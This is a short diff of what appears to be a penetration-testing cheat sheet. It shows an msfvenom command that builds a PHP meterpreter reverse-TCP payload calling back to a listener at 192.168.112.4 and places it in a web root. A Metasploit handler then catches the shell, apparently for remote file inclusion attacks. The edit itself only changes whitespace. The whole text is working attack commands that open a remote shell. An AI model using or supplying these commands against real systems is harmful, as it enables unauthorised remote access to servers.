@@ -4,10 +4,10 @@
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.112.4 LPORT=4446 -f raw -o /var/www/html/evil.txt
 msfconsole  
-use exploit/multi/handler 
-set LPORT 4446  
-set LHOST 192.168.112.4 
-set PAYLOAD php/meterpreter_reverse_tcp 
+use exploit/multi/handler   
+set LPORT 4446    
+set LHOST 192.168.112.4   
+set PAYLOAD php/meterpreter_reverse_tcp   
 run 
 
 ***Remote & Local File Inclusion (RFI/LFI)***
